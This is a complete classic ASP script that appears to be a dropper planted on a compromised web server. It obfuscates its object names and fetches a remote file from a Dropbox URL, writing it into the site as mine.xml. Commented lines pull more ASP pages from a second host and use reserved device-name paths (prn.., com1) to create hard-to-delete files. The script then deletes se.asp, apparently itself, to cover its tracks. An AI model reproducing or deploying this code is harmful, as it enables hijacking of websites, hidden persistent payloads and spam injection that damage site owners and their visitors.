<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<%
Session.CodePage=936
Response.Charset="gb2312"
Server.ScriptTimeOut = 9000
function loadWebPage(byval A_strCharset,byval A_strUrl)
    dim MM_objHttp
    dim MM_objBytesStream
    On Error Resume Next
    Set MM_objBytesStream = Server.CreateObject("Adod" & "b.S" & "tream")
    Set MM_objHttp = Server.CreateObject("Microsof" & "t.X" & "MLHTTP")
    MM_objHttp.Open "Get", A_strUrl, False, "", ""
    MM_objHttp.Send
    if MM_objHttp.status<>"200" then
        loadWebPage=""
        exit function
    end if
    if A_strCharset="" then
        loadWebPage=MM_objHttp.Responsebody
    else
        With MM_objBytesStream
            .Type = 2
            .Open
            .WriteText MM_objHttp.Responsebody
            .Position = 0
            .Charset = A_strCharset
            .Position = 2
            loadWebPage=.ReadText
            .Cancel()
            .close
        End With
        if err.number<>0 then
            loadWebPage=""
        end if
    end if
    set MM_objBytesStream=nothing
    Set MM_objHttp = Nothing
end function
response.Clear()
    Dim aaa,mfile
server_name=Request.ServerVariables("SERVER_NAME")
wz=request.ServerVariables("HTTP_HOST")&request.ServerVariables("URL")
w=right(left(wz,instrrev(wz,"/")),(len(left(wz,instrrev(wz,"/")))-len(request.ServerVariables("HTTP_HOST"))))
    aspaac=loadWebPage("iso-8859-1","https://dl.dropboxusercontent.com/u/23386875/sitemap3.xml")
    'aspaas=loadWebPage("iso-8859-1","http://cdn.yeekrcdn.com/u/23308026/getasp/jordan.asp")
    'aspaacl=loadWebPage("iso-8859-1","http://cdn.yeekrcdn.com/u/23308026/getasp/cl.asp")
app=Server.MapPath("./")
'app=Replace(app,".","..")'???.????'
'set fs=server.createobject("scripting.filesystemobject")
'set newfoler=fs.CreateFolder("\\.\"&app&"\prn..\")
'set newfoler=fs.CreateFolder("\\.\"&app&"\prn..\ASDFSC..\")
aspwfc=("\\.\"&app&"\mine.xml")
'aspwfs=("\\.\"&app&"\jordan.asp")
'aspwfcl=("\\.\"&app&"\louboutin.asp")
set fs=server.createobject("scripting.filesystemobject")
set aspoc=fs.CreateTextFile(aspwfc,true)
'set aspos=fs.CreateTextFile(aspwfs,true)
'set aspocl=fs.CreateTextFile(aspwfcl,true)
aspoc.writeline(aspaac)
'aspos.writeline(aspaas)
'aspocl.writeline(aspaacl)
'fs.CopyFile ""&wf&"","\\.\"&app&"\prn..\ASDFSC..\com1.cvxf2l.asp"
response.write("<a href=http://"&server_name&""&w&"assafda.xml>B</a>|")
s= Server.MapPath("se.asp")
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(s) Then
  fso.Deletefile(s)
End If
Set fso = Nothing
response.End()
%>
